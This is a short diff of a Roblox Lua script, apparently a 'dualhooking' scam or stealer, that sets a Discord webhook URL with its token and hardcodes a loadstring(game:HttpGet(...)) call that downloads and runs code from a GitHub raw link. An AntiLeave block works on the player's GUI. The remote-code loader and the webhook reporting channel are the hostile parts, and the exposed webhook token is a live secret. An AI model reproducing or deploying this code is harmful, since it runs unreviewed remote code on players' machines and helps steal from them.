@@ -1,3 +1,4 @@
+--test
 local dhuser = "kaino120"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1144531084340633660/Ve0NJKqiiDGg0yB5EOT-Wu64UpUYmdIddKV8fdU8TlPQSbI1wxm8jquXHc7_jmvDIsQO" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/Azurexc/texy/main/lsbl" -- Put Your LoadingScreen Raw Link Here
@@ -102,7 +103,7 @@ end
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet(loadingraw))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Azurexc/texy/main/lsbl"))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
